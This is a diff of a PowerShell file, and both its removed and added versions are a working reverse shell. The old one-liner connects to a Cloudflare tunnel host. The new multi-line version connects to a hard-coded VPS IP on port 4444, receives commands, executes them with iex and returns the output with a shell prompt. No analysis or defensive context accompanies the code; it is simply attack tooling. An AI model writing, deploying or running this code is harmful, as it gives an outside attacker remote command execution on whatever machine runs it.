@@ -1,1 +1,14 @@
-$c=New-Object Net.Sockets.TCPClient('https://italy-nuke-personality-position.trycloudflare.com',80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$b2=([text.encoding]::ASCII).GetBytes($o2);$s.Write($b2,0,$b2.Length);$s.Flush()};$c.Close()
+$ip = "34.131.81.121"  # Update this if your VPS IP changes
+$port = 4444
+$client = New-Object Net.Sockets.TCPClient($ip,$port)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
+    $cmd = (iex $data 2>&1 | Out-String)
+    $response = $cmd + "PS " + (pwd).Path + "> "
+    $bytes_send = ([text.encoding]::ASCII).GetBytes($response)
+    $stream.Write($bytes_send,0,$bytes_send.Length)
+    $stream.Flush()
+}
+$client.Close()
